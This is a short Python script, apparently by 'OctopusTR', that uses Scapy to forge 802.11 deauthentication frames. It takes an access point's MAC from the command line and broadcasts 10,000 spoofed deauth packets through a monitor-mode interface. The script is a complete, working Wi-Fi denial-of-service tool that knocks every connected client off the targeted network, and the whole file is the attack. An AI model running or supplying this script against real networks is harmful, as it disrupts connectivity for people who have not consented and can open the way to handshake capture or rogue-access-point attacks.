#!/usr/bin/python

import sys
from scapy.all import *

#Author: OctopusTR

bmac = "ff:ff:ff:ff:ff:ff"

pkt = RadioTap() / Dot11( addr1 = bmac, addr2 = sys.argv[1], addr3 = sys.argv[1])/ Dot11Deauth()

sendp(pkt, iface = "mon0", count = 10000, inter = .2)